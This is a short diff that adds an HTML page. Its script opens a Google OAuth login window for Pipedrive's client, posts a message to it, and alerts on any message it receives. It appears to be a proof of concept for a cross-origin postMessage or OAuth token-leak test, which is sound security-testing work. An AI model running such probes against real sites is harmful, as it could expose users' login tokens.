@@ -1,0 +1,18 @@
+<!doctype html>
+<body>
+<script>
+    var openedWindow = window.open('https://accounts.google.com/o/oauth2/v2/auth?scope=openid%20email%20profile&state=klCpU8Y6yEKpltkOJsJu&response_type=code+token&client_id=207967787620-a58qmlbt6v6k3chaculgdpteldvtiijf.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fapp.pipedrive.com%2Fauth%2Fgoogle%2Fcallback')
+
+   const ok = function () {
+    setTimeout(openedWindow.postMessage("ehhe",'https://app.pipedrive.com/auth/login'), 5000)
+   }
+
+    ok()
+
+    
+    window.addEventListener("message", function(e){
+     alert("Target site says" + e.data)
+    }
+);
+</script>
+    </body>
